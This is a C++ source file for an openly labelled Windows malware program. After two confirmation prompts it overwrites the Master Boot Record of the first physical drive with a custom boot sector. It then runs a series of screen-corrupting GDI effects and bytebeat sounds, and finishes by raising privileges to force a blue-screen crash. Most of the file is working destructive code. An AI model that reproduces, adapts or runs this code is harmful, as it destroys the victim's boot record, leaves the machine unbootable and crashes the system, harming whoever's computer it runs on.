#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = {
	0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E,
	0xC0, 0xBE, 0xC1, 0x7D, 0xBF, 0x20, 0x14, 0x2E, 0xAD, 0x91, 0xBB, 0xF0,
	0x00, 0xD1, 0xE1, 0xB8, 0x18, 0x37, 0x73, 0x03, 0xB8, 0x38, 0x02, 0xE8,
	0x22, 0x00, 0x01, 0xDF, 0x83, 0xEB, 0x10, 0x72, 0x4F, 0xE8, 0x18, 0x00,
	0x29, 0xDF, 0x83, 0xEF, 0x08, 0xEB, 0xE2, 0xAD, 0x97, 0xAD, 0x84, 0xE4,
	0x93, 0xB0, 0x30, 0x50, 0xC6, 0x44, 0xFF, 0x02, 0xE8, 0xAE, 0x00, 0x58,
	0x50, 0x53, 0x51, 0x57, 0x50, 0xBB, 0x79, 0x7D, 0x2E, 0xD7, 0x93, 0xB9,
	0x08, 0x00, 0x88, 0xF8, 0xD0, 0xE3, 0x72, 0x02, 0x31, 0xC0, 0x80, 0xFF,
	0x10, 0x72, 0x07, 0x80, 0x3D, 0x0E, 0x74, 0x98, 0x32, 0x05, 0xAA, 0xE2,
	0xE9, 0x81, 0xC7, 0x38, 0x01, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xD5, 0x5F,
	0x59, 0x5B, 0x58, 0xC3, 0x81, 0xC7, 0x88, 0x09, 0x81, 0xFE, 0xEB, 0x7D,
	0x75, 0x8D, 0xB1, 0x05, 0xB8, 0x02, 0x00, 0x2E, 0xA5, 0xAB, 0xE2, 0xFB,
	0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x04, 0xFA, 0x74, 0xF6, 0x89, 0x16,
	0x04, 0xFA, 0xB4, 0x01, 0xCD, 0x16, 0xB4, 0x00, 0x74, 0x02, 0xCD, 0x16,
	0x88, 0xE0, 0x3C, 0x01, 0x75, 0x02, 0xCD, 0x20, 0x2C, 0x48, 0x72, 0x0C,
	0x3C, 0x09, 0x73, 0x08, 0xBB, 0xF5, 0x7D, 0x2E, 0xD7, 0xA2, 0xFE, 0xF9,
	0xBE, 0x20, 0xE6, 0xAD, 0x97, 0xAD, 0x93, 0x31, 0xC0, 0xE8, 0x2B, 0x00,
	0x80, 0x36, 0xFF, 0xF9, 0x80, 0xB8, 0x28, 0x0E, 0x78, 0x07, 0xA0, 0x22,
	0xE6, 0xB1, 0x03, 0xD2, 0xE0, 0xE8, 0x68, 0xFF, 0xBD, 0x37, 0x7C, 0xB7,
	0x21, 0xFF, 0xD5, 0xB7, 0x2E, 0xFF, 0xD5, 0xB7, 0x28, 0xFF, 0xD5, 0xB7,
	0x34, 0xFF, 0xD5, 0xEB, 0x9B, 0x74, 0x03, 0xE8, 0x4E, 0xFF, 0x89, 0xF8,
	0x31, 0xD2, 0xB9, 0x40, 0x01, 0xF7, 0xF1, 0x88, 0xD4, 0x08, 0xC4, 0x80,
	0xE4, 0x07, 0x75, 0x5A, 0xB5, 0x37, 0x38, 0x6D, 0xFF, 0x10, 0xE4, 0x38,
	0xAD, 0x00, 0x0A, 0x10, 0xE4, 0x38, 0x6D, 0x08, 0x10, 0xE4, 0x38, 0xAD,
	0xC0, 0xFE, 0x10, 0xE4, 0x84, 0xFF, 0x74, 0x2B, 0xF6, 0xC3, 0x05, 0x74,
	0x0C, 0x3B, 0x16, 0x00, 0xFA, 0xB0, 0x02, 0x72, 0x0C, 0xB0, 0x08, 0xEB,
	0x08, 0x3C, 0x00, 0xB0, 0x04, 0x72, 0x02, 0xB0, 0x01, 0x84, 0xC4, 0x75,
	0x23, 0x88, 0xD8, 0x84, 0xC4, 0x75, 0x1D, 0xD0, 0xE8, 0x75, 0xF8, 0xB0,
	0x08, 0xEB, 0xF4, 0x89, 0x16, 0x00, 0xFA, 0x2E, 0xA2, 0x3A, 0x7D, 0xA0,
	0xFE, 0xF9, 0x84, 0xC4, 0x75, 0x06, 0x20, 0xDC, 0x74, 0x1A, 0x88, 0xD8,
	0x88, 0x44, 0xFE, 0xA8, 0x05, 0xBB, 0x80, 0xFD, 0x75, 0x03, 0xBB, 0x02,
	0x00, 0xA8, 0x0C, 0x74, 0x02, 0xF7, 0xDB, 0x01, 0xDF, 0x89, 0x7C, 0xFC,
	0xC3, 0x00, 0x42, 0xE7, 0xE7, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xFC,
	0xF0, 0xF0, 0xFC, 0x7E, 0x3C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
	0xFF, 0x3C, 0x7E, 0xFF, 0xFF, 0xE7, 0xE7, 0x42, 0x00, 0x3C, 0x7E, 0xFF,
	0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xDB, 0xDB, 0xFF, 0xFF, 0xFF,
	0xA5, 0x00, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x3C, 0x7E, 0x3F,
	0x0F, 0x0F, 0x3F, 0x7E, 0x3C, 0x00, 0x00, 0xFE, 0x7F, 0x02, 0x42, 0x02,
	0x42, 0xFF, 0x7F, 0x40, 0x42, 0x7E, 0x7E, 0x02, 0x02, 0x7F, 0x02, 0xC0,
	0x03, 0x40, 0x02, 0x7F, 0x02, 0x40, 0x02, 0xFE, 0x7F, 0x02, 0x42, 0xFF,
	0x7B, 0x40, 0x0A, 0x7E, 0x7E, 0x02, 0x40, 0xFF, 0x7F, 0x00, 0x00, 0x98,
	0xAA, 0x90, 0x50, 0x98, 0x64, 0xA0, 0x3C, 0xA8, 0x50, 0x01, 0x00, 0x00,
	0x08, 0x00, 0x02, 0x00, 0x00, 0x04, 0x55, 0xAA
};

void mbr()
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
DWORD WINAPI payload2(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while(1){
    	HDC hdc = GetDC(0);
		POINT p[4]  = {rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh};
        HPEN hPen = CreatePen(PS_SOLID,5,RGB(0,0,255));
        SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
    	DeleteObject(hPen);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload2dot1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	RECT wRect;
    POINT wPt[3];
	while (1)
	{
	GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 1 + 1;
    wPt[0].y = wRect.top + 7 + 6;
    wPt[1].x = wRect.right + 2 + 3;
    wPt[1].y = wRect.top + 5 + 9;
    wPt[2].x = wRect.left + 2 + 6;
    wPt[2].y = wRect.bottom + 0 + 3;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
   }
}
DWORD WINAPI payload4(LPVOID lpParam) {
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_WARNING));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
	}
}
DWORD WINAPI payload5(LPVOID lpParam) {
    HWND v3; 
    HBITMAP h; 
    HDC hdcSrc; 
    HDC hdc; 
    void* lpvBits;
    int nHeight; 
    int nWidth; 
    DWORD v12; 
    int j; 
    int v14; 
    int i; 
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload6(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"LOLOLOLOLOLOOLOLOLLOLOLOL";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(100);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t>>12|t>>8)&63&t>>4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t>>9&t)*t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(3*((t>>1)+20)*t>>14*t>>18);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t*t/(1+(t>>6&t>>8)))&236);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>8*(t>>15|t>>8)&(20|5*(t>>19)>>t|t>>3)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    if (MessageBoxW(NULL, L"WARNING THIS IS A MALWARE!!!!!! RUN MALWARE?????", L"Hey Die For You", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"last warning! ARE YOU SURE?", L"oh no your computer will desteoy", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            sound6();
            Sleep(30000);
            //boolean
			       BOOLEAN b;
			      //bsod response
			      unsigned long response;
			      //process privilege
			      RtlAdjustPrivilege(19, true, false, &b);
			      //call bsod
			      NtRaiseHardError(0xC000021C, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}
